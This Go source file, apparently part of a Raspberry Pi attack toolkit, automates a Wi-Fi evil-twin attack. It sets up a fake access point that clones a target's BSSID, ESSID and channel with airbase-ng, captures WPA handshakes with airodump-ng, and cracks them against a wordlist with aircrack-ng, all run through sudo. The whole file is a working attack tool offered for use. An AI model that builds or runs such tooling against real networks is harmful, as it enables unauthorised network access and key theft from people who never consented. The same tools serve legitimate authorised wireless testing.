package modules

import (
	"bufio"
	"os"
	"os/exec"
	"path"
	"strings"
	"time"

	"github.com/5N41P4/raspberry/internal/data"
)

var AttackBasePath = "/usr/local/raspberry/attacks"

type FakeAP struct {
	Handshake bool `json:"handshake"`
	Key       bool `json:"key"`
	Target    *data.Target
	AP        *exec.Cmd
	Monitor   *exec.Cmd
	Crack     *exec.Cmd
}

// FakeAPModule is a module for creating a fake AP

// New creates a new instance of the FakeAP struct with the specified parameters.
// It sets up the necessary commands for creating a fake access point (AP) and performing related actions.
// The function takes a name string and a pointer to an ApiFakeAPAction struct as input.
// The name parameter represents the name of the network interface to be used for the fake AP.
// The f parameter contains the configuration details for the fake AP, such as BSSID, channel, ESSID, cipher, etc.
// The function returns a pointer to the created FakeAP struct and an error, if any.
// If the interface is not in monitor mode, the function tries to set it using the "airmon-ng start" command.
// It also creates a directory at AttackBasePath if it doesn't exist already.
// The function generates the necessary commands for creating the fake AP, monitoring the network, and cracking the captured handshake.
// The generated commands are stored in the respective fields of the FakeAP struct.
// The path for storing the captured data and key files is determined based on the ESSID and current timestamp.
// The function returns the created FakeAP struct and any error encountered during the setup process.
func NewFakeAP(name string, f *data.Target) (*FakeAP, error) {
	// If the interface is not in monitor mode, try to set it.
	mon := exec.Command("sudo", "airmon-ng", "start", name)
	_ = mon.Run()

	fileInfo, err := os.Stat(AttackBasePath)
	if os.IsNotExist(err) || !fileInfo.IsDir() {
		err = os.MkdirAll(AttackBasePath, 0770)
	}
	if err != nil {
		return &FakeAP{}, err
	}

	fakeAp := &FakeAP{
		Target:    f,
		Handshake: false,
		Key:       false,
	}

	path := path.Join(AttackBasePath, "/", fakeAp.Target.Essid, "/", time.Now().Format("02.01.2006_15:04"))

	// Create the fake AP Command
	ap := exec.Command("sudo", generateAirbase(fakeAp, name)...)
	fakeAp.AP = ap

	// Create the airodump-ng Command
	dump := exec.Command("sudo", "airodump-ng", "-c", fakeAp.Target.Channel, "-d", fakeAp.Target.Bssid, "-w", path, name)
	fakeAp.Monitor = dump

	// Create the aircrack-ng Command
	cr := exec.Command("sudo", "aircrack-ng", path+"-cap01.cap", "-l", path+"-key", "-w", AttackBasePath+"/wordlist.txt")
	fakeAp.Crack = cr

	return fakeAp, err
}

func (f *FakeAP) Start() {
	apOut, _ := f.AP.StdoutPipe()
	f.AP.Start()

	apScan := bufio.NewScanner(apOut)
	scanAP(apScan)

	dumpOut, _ := f.Monitor.StdoutPipe()
	f.Monitor.Start()

	dumpScan := bufio.NewScanner(dumpOut)
	monitorAP(dumpScan)
	f.Handshake = true

	if err := f.Crack.Run(); err == nil {
		f.Key = true
		return
	}
}

func scanAP(s *bufio.Scanner) {
	for s.Scan() {
		m := s.Text()
		if strings.Contains(m, "Client") {
			return
		}
	}
}

func monitorAP(s *bufio.Scanner) {
	// Start the airodump-ng command
	for s.Scan() {
		m := s.Text()
		if strings.Contains(m, "handshake") || strings.Contains(m, "keystream") {
			return
		}
	}
}

func generateAirbase(f *FakeAP, name string) []string {
	at := []string{"airbase-ng"}
	bssid := getBssidSlice(f.Target.Bssid)
	channel := []string{"-c", f.Target.Channel}
	cipher := getCipherSlice(f.Target.Cipher)
	essid := []string{"-e", f.Target.Essid}
	wep := []string{"-W", "1"}

	cmd := appendSlices(at, bssid, channel, essid, cipher, wep, []string{name})

	return cmd
}

func appendSlices(slices ...[]string) []string {
	var result []string
	for _, slice := range slices {
		result = append(result, slice...)
	}
	return result
}

func getCipherSlice(c string) []string {
	switch {
	case strings.Contains(c, "WEP"):
		return []string{"-N"}
	case strings.Contains(c, "WPA"):
		return []string{"-z", "2"}
	case strings.Contains(c, "WPA2"):
		return []string{"-Z", "4"}
	default:
		return []string{}
	}
}

func getBssidSlice(bssid string) []string {
	if bssid == "" {
		return []string{"-a", "E4:FA:C4:6F:73:48"}
	}
	return []string{"-a", bssid}
}
